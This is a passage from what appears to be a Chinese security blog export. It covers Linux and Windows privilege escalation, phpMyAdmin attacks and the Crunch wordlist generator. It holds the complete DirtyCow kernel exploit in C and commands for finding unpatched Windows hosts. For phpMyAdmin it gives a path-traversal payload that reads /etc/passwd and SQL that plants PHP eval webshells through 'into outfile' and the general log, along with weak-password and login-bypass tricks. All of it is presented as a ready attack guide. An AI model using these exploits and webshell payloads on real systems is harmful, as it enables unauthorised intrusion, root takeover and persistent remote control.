3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)CVE-2013-1858 [clown-newuser] (3.3-3.8)CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)CVE-2013-0268 [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)CVE-2004-1235 [elflbl] (2.4.29)CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</code></pre><h2 id="0x11-常用脚本工具"><a href="#0x11-常用脚本工具" class="headerlink" title="0x11 [常用脚本工具]"></a>0x11 <span id="tools">[<strong>常用脚本工具</strong>]</span></h2><ol><li>busybox</li><li><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">Linux信息搜集脚本</a></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/1.png" alt></li><li><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">Linux权限检查脚本</a></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/2.png" alt></li><li><a href="https://github.com/mzet-/linux-exploit-suggester.git" target="_blank" rel="noopener">Linux漏洞建议脚本</a></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/3.png" alt></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/4.png" alt></li></ol><h2 id="0x12-Linux提权例子"><a href="#0x12-Linux提权例子" class="headerlink" title="0x12 Linux提权例子"></a>0x12 Linux提权例子</h2><p><strong>本地博客</strong></p><ol><li><a href="http://localhost:4000/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/" target="_blank" rel="noopener">脏牛提权</a></li><li><a href="http://localhost:4000/HTB-Wall/" target="_blank" rel="noopener">利用screen-4.5.0提权</a></li></ol><p><strong>互联网博客</strong></p><ol><li><a href="https://10fteam.github.io/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/">脏牛提权</a></li><li><a href="https://10fteam.github.io/HTB-Wall/">利用screen-4.5.0提权</a></li></ol><h2 id="0xFF-脚本源码"><a href="#0xFF-脚本源码" class="headerlink" title="0xFF 脚本源码"></a>0xFF 脚本源码</h2><p><strong>CVE-2016-5195（dirtycow）</strong></p><pre><code>/*####################### dirtyc0w.c #######################$ sudo -s# echo this is not a test &gt; foo# chmod 0404 foo$ ls -lah foo-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foothis is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000mmap 56123000madvise 0procselfmem 1800000000$ cat foom00000000000000000####################### dirtyc0w.c #######################*/#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void *map;int f;struct stat st;char *name;void *madviseThread(void *arg){  char *str;  str=(char*)arg;  int i,c=0;  for(i=0;i&lt;100000000;i++)  {/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/    c+=madvise(map,100,MADV_DONTNEED);  }  printf(&quot;madvise %d\n\n&quot;,c);}void *procselfmemThread(void *arg){  char *str;  str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat&gt;  Enterprise Linux 5 and 6 out of the box because on one side of&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not&gt;  writable on Red Hat Enterprise Linux 5 and 6.*/  int f=open(&quot;/proc/self/mem&quot;,O_RDWR);  int i,c=0;  for(i=0;i&lt;100000000;i++) {/*You have to reset the file pointer to the memory position.*/    lseek(f,(uintptr_t) map,SEEK_SET);    c+=write(f,str,strlen(str));  }  printf(&quot;procselfmem %d\n\n&quot;, c);}int main(int argc,char *argv[]){/*You have to pass two arguments. File and Contents.*/  if (argc&lt;3) {  (void)fprintf(stderr, &quot;%s\n&quot;,      &quot;usage: dirtyc0w target_file new_content&quot;);  return 1; }  pthread_t pth1,pth2;/*You have to open the file in read only mode.*/  f=open(argv[1],O_RDONLY);  fstat(f,&amp;st);  name=argv[1];/*You have to use MAP_PRIVATE for copy-on-write mapping.&gt; Create a private copy-on-write mapping.  Updates to the&gt; mapping are not visible to other processes mapping the same&gt; file, and are not carried through to the underlying file.  It&gt; is unspecified whether changes made to the file after the&gt; mmap() call are visible in the mapped region.*//*You have to open with PROT_READ.*/  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);  printf(&quot;mmap %zx\n\n&quot;,(uintptr_t) map);/*You have to do it on two threads.*/  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);/*You have to wait for the threads to finish.*/  pthread_join(pth1,NULL);  pthread_join(pth2,NULL);  return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Windows</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-windows提权"><a href="#0x00-windows提权" class="headerlink" title="0x00 windows提权"></a>0x00 windows提权</h2><ol><li><strong>微软安全公告：</strong><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></li><li>常用的几个已公开的exp</li></ol><pre><code>KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780</code></pre><ol><li>查找可写目录（可上传webshell来查看可读可写目录），如temp目录：dir temp /s</li><li><strong>cmd执行命令查看哪些补丁没补（通用版）：</strong></li><li>systeminfo&gt;test.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type test.txt|@find /i &quot;%i&quot;|| @echo %i you can use)&amp;del /f /q /a test.txt</li><li><strong>2003版：</strong></li><li>systeminfo&gt;temp.txt&amp;(for %i in (KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440) do @type temp.txt|@find /i &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt</li></ol><h2 id="0x01-提权例子"><a href="#0x01-提权例子" class="headerlink" title="0x01 提权例子"></a>0x01 提权例子</h2><ol><li>windows server 2003 R2 Enterprise x64 Edition SP2 </li><li>CVE-MS10-048</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/2.png" alt></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/3.png" alt></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/4.png" alt></li></ol><h2 id="0xFF-参考链接及利用链接"><a href="#0xFF-参考链接及利用链接" class="headerlink" title="0xFF 参考链接及利用链接"></a>0xFF 参考链接及利用链接</h2><ol><li><a href="https://packetstormsecurity.com/search/?q=MS16-016" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS16-016</a></li></ol><p><a href="https://micro8.gitbook.io/micro8/contents-1/1-10/1windows-ti-quan-kuai-su-cha-zhao-exp" target="_blank" rel="noopener"><strong>EXP说明</strong></a></p><pre><code>MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8)CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008）CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008)MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP)MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1)MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012)MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012)MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012)MS16-016 [KB3136041] [WebDAV] (2008/Vista/7)MS15-097 [KB3089656] [remote code execution] (win8.1/2012)MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012)MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012)MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012)MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012)MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8)MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2)MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8)MS14-070 [KB2989935] [Kernel Driver] (2003)MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8)MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8)MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8)MS14-002 [KB2914368] [NDProxy] (2003/XP)MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7)MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7)MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8)MS12-042 [KB2972621] [Service Bus] (2008/2012/win7)MS12-020 [KB2671387] [RDP] (2003/2008/7/XP)MS11-080 [KB2592799] [AFD.sys] (2003/XP)MS11-062 [KB2566454] [NDISTAPI] (2003/XP)MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP)MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista)MS10-092 [KB2305420] [Task Scheduler] (2008/7)MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5)MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista)MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP)MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2)MS09-050 [KB975517] [Remote Code Execution] (2008/Vista)MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0)MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista)MS08-068 [KB957097] [Remote Code Execution] (2000/XP)MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008)MS08-066 [] [] (Windows 2000/XP/Server 2003)MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista)MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000)MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin</title>
      <link href="/phpmyadmin/"/>
      <url>/phpmyadmin/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-phpmyadmin"><a href="#0x00-phpmyadmin" class="headerlink" title="0x00 phpmyadmin"></a>0x00 phpmyadmin</h2><p>&ensp;&ensp;&ensp;&ensp;phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><h2 id="0x01-本地文件包含"><a href="#0x01-本地文件包含" class="headerlink" title="0x01 本地文件包含"></a>0x01 本地文件包含</h2><ol><li>受影响的系统版本为 phpMyadmin 4.8.0 和 phpMyadmin 4.8.1，漏洞编号 CVE-2018-12613。</li><li>弱口令root/root进入后台：</li><li><img src="/phpmyadmin/1.png" alt></li><li><strong>Linux版本地文件包含</strong></li><li>index.php?target=db_sql.php%253f/../../../../../../../etc/passwd</li><li><strong>windows版本地文件包含</strong></li><li>index.php?target=db_sql.php%253f/../../../../../../../phpinfo.txt #根目录下</li><li><img src="/phpmyadmin/2.png" alt></li><li><img src="/phpmyadmin/3.png" alt></li><li>index.php?target=db_sql.php%253f/../../../../../../../temp/phpinfo.txt ##根目录下temp目录</li><li><img src="/phpmyadmin/4.png" alt></li><li><img src="/phpmyadmin/5.png" alt></li></ol><p><strong>本地包含session文件</strong></p><ol><li>执行sql语句，写入到session文件，记住cookie</li><li><img src="/phpmyadmin/6.png" alt></li><li>找到网站路径</li><li><img src="/phpmyadmin/7.png" alt></li><li>（验证）本地查找一下session文件，存在sess_mgcinsl509r7s57lprvan94ep84jn8n3</li><li><img src="/phpmyadmin/8.png" alt></li><li><strong>包含session文件</strong></li><li>index.php?target=db_sql.php%253f/../../../tmp/tmp/sess_mgcinsl509r7s57lprvan94ep84jn8n3  #具体多少个../，需要根据实际情况增减</li><li><img src="/phpmyadmin/9.png" alt></li></ol><h2 id="0x02-读写文件"><a href="#0x02-读写文件" class="headerlink" title="0x02 读写文件"></a>0x02 读写文件</h2><ol><li>windows版mysql配置文件my.ini，Linux版mysql配置文件my.cnf</li><li>先查询配置：</li><li>show GLOBAL VARIABLES like ‘%secure%’;</li><li><img src="/phpmyadmin/10.png" alt></li><li>NULL，表示不能使用load_file和into outfile来读写文件</li><li><img src="/phpmyadmin/11.png" alt></li><li>C:\temp\，表示只能读写该目录下的文件</li><li><strong>读文件</strong></li><li><img src="/phpmyadmin/12.png" alt></li><li>读不到其他目录下的文件</li><li><img src="/phpmyadmin/13.png" alt></li><li><strong>写文件</strong></li><li>select ‘<?php eval($_POST[1]);?>‘ into outfile ‘c:/temp/test.php’;</li><li><img src="/phpmyadmin/14.png" alt></li><li><img src="/phpmyadmin/15.png" alt></li><li>写不到其他目录下</li><li><img src="/phpmyadmin/16.png" alt></li><li>参数secure_file_priv的值为空白，就可以任意读写了</li><li><img src="/phpmyadmin/17.png" alt></li><li>select load_file(‘c:/windows/win.ini’);</li><li><img src="/phpmyadmin/18.png" alt></li><li>select ‘<?php eval($_POST[1]);?>‘ into outfile ‘c:/test.php’;</li><li><img src="/phpmyadmin/19.png" alt></li><li><img src="/phpmyadmin/20.png" alt></li></ol><h2 id="0x03-phpmyadmin-本地日志文件getshell"><a href="#0x03-phpmyadmin-本地日志文件getshell" class="headerlink" title="0x03 phpmyadmin 本地日志文件getshell"></a>0x03 phpmyadmin 本地日志文件getshell</h2><ol><li>登录phpmyadmin之后——变量——搜索general</li><li>或者SQL语句查询：show GLOBAL VARIABLES like ‘%general%’;</li><li><img src="/phpmyadmin/37.png" alt></li><li>SQL语句修改配置：set global general_log=’ON’;</li><li>SQL语句修改配置：set global general_log_file=’C:\phpStudy\PHPTutorial\www\1.php’;</li><li><img src="/phpmyadmin/21.png" alt></li><li>或者编辑——配置</li><li>修改general log的值为ON，默认为OFF</li><li>修改general log file的值为网站下的目录，如phpstudy安装之后，默认目录为..\phpStudy\PHPTutorial\www[website]，所以这里值为C:\phpStudy\PHPTutorial\www\1.php</li><li><img src="/phpmyadmin/38.png" alt></li><li>写个测试代码，执行</li><li><img src="/phpmyadmin/39.png" alt></li><li>访问URL/1.php</li><li><img src="/phpmyadmin/40.png" alt></li><li>C:\phpStudy\PHPTutorial\MySQL\data\WINserver2008DC.log</li></ol><h2 id="0x04-mysql-phpmyadmin"><a href="#0x04-mysql-phpmyadmin" class="headerlink" title="0x04 mysql-phpmyadmin"></a>0x04 mysql-phpmyadmin</h2><pre><code>create table aaa(bbb text not null); #建表aaa，列bbbinsert into aaa(bbb) values(&#39;&lt;?php eval($_POST[test])?&gt;&#39;); #插入值到aaa表bbb列select bbb from aaa into outfile &quot;C:/phpStudy/PHPTutorial/WWW/test.php&quot;; #导出值到文件drop table if exists aaa;  #删除表</code></pre><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p>0x01 PREGREPLACEEVAL漏洞<br>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><p>利用模块：exploit/multi/http/phpmyadminpregreplace CVE: CVE-2013-3238<br>——————————————————————————————————————</p><p>0x02 serversync.php 后门漏洞<br>影响版本：phpMyAdmin v3.5.2.2</p><p>利用模块：exploit/multi/http/phpmyadmin3522_backdoor CVE: CVE-2012-5159<br>——————————————————————————————————————</p><p>0x03 PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>影响版本： 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;</p><p>利用模块：exploit/unix/webapp/phpmyadmin_config CVE: CVE-2009-1151<br>——————————————————————————————————————</p><p>0x04 万能登陆<br>影响版本：2.11.3 / 2.11.4</p><p>利用方法：用户名处写入‘localhost’@‘@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)<br>——————————————————————————————————————</p><p>0x05 phpmyadmin配合phpinfo getshell<br>影响版本：2.8.0.3</p><p><a href="https://www.t00ls.net/thread-37889-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-37889-1-1.html</a><br>——————————————————————————————————————</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crunch</title>
      <link href="/Crunch/"/>
      <url>/Crunch/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Crunch"><a href="#0x00-Crunch" class="headerlink" title="0x00 Crunch"></a>0x00 Crunch</h2><p>&ensp;&ensp;&ensp;&ensp;kali里一款字典生成工具。</p><h2 id="0x01-Crunch参数"><a href="#0x01-Crunch参数" class="headerlink" title="0x01 Crunch参数"></a>0x01 Crunch参数</h2><ol><li>-b [number][size]</li><li><ul><li>仅在使用-o START时有效，如：crunch 6 8 -b 30mb -o START</li></ul></li><li>-c [number]</li><li><ul><li>指定输出行数，仅在使用-o START时有效，如：crunch 1 1 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -c 50 -o START</li></ul></li><li>-f 指定字符集</li><li><ul><li>如：crunch 1 1 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o 1234.txt</li></ul></li><li>-d [number]</li><li><ul><li>限制连续重复出现的次数，如：-d 2，那aab、aac可以输出到字典，aaa就不行</li></ul></li><li>-e string </li><li><ul><li>Specifies when crunch should stop early</li></ul></li><li>-i </li><li><ul><li>反方向输出，aaa、baa、caa、aba、bba等，而不是aaa、aab、aac</li></ul></li><li>-l </li><li><ul><li>使用-t时，此选项将那些符号当作常量</li></ul></li><li>-o [filename]</li><li><ul><li>输出到文件</li></ul></li><li>-p [str1] [str2]…</li><li><ul><li>生成没有重复字符的字词，如：默认是abc，长度4，默认生成3^4=81，即aaaa,aaab,…,cccc，但此参数只是生成3!=6个，abc/acb/bac/bca/cba/cab，此参数不能与-s一起使用，并且忽略最小和最大长度，但还是需要指定两个范围数字</li></ul></li><li>-q [filename]</li><li><ul><li>读文件且替换读取的内容</li></ul></li><li>-r </li><li><ul><li>中断处恢复生成字词，仅对使用-o时有效，如果原始命令中有-s，必须把-s删除，只需将-r添加在原始命令的末尾即可</li></ul></li><li>-s [字符串]</li><li><ul><li>指定起始字符串，如：123qweasd</li></ul></li><li>-t @,%^</li><li><ul><li>指定字词的格式, 如: @@god@@@@ 将会生成 aagodbbbb类似的，@、,、%、^将会被替换成相对应的数字或字符或符号</li></ul></li><li><ul><li>@将插入小写字符</li></ul></li><li><ul><li>,将插入大写字符</li></ul></li><li><ul><li>%将插入数字</li></ul></li><li><ul><li>^将插入符号</li></ul></li><li>-u </li><li><ul><li>禁用printpercentage线程</li></ul></li><li>-z gzip/bzip2/lzma/7z</li><li><ul><li>输出到压缩文件，gzip最快，但压缩是最小的，7z最慢，但压缩效果最好。</li></ul></li></ol><h2 id="0x01-Crunch例子"><a href="#0x01-Crunch例子" class="headerlink" title="0x01 Crunch例子"></a>0x01 Crunch例子</h2><ol><li>crunch 1 8 #即生成a至zzzzzzzz的字典</li><li>crunch 1 6 abcdefg #即生成a至gggggg的字典</li><li>crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt #使用文件charset.lst中的mixalpha-numeric-all-space字符集，即生成a至8个空格结尾</li><li>crunch 8 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa #使用字符集生成字词长度为8的字典，从cbdogaaa开始，[空格][空格]dog[空格][空格][空格]结尾</li><li>crunch 2 3 -f charset.lst ualpha -s BB #断点续建，-s [下一个字词]，记得修改文件名，否则覆盖现有的字典</li><li>crunch 4 5 -p abc #数字不重要，但必须有数字，重要的是abc，即生成abc、acb、bac、bca、cba、cab</li><li>crunch 4 5 -p dog cat bird</li><li><ul><li>birdcatdog</li></ul></li><li><ul><li>birddogcat</li></ul></li><li><ul><li>catbirddog</li></ul></li><li><ul><li>catdogbird</li></ul></li><li><ul><li>dogbirdcat</li></ul></li><li><ul><li>dogcatbird</li></ul></li><li>crunch 1 5 -o START -c 